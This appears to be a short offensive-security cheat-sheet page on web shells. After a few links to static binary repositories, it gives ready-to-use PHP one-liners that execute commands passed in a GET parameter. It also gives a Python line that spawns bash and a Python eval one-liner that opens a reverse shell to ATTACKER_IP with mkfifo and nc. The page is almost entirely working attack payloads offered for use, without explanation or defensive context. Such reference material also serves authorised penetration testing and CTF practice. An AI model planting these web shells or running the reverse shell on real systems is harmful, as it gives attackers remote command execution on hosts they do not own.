---
sidebar_position: 2
title: WebShell's - Binaries
---


- **Static Binaries:** <a class="button button--outline button--warning" href="https://repology.org/">REPOLOGY.org</a> <a class="button button--outline button--warning" href="https://ubuntu.pkgs.org/">PKGS.org</a> <a class="button button--outline button--info" href="https://github.com/andrew-d/static-binaries">Binaries GitHub</a>


## PHP

- **Simple `PHP` WebShell's**

```php
<?php echo shell_exec($_GET["cmd"]);?>
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
<?php system($_GET['cmd']);?>
```


## Python


```py
# Executing a SHELL from a Running Python Instance
__import__('os').system('bash')
```


```py
# Executing a Reverse SHELL from a Running Python Instance
eval('__import__("os").system("mkfifo /tmp/dktkcfp; nc ATTACKER_IP PORT 0</tmp/dktkcfp | /bin/sh >/tmp/dktkcfp 2>&1; rm /tmp/dktkcfp")')
```

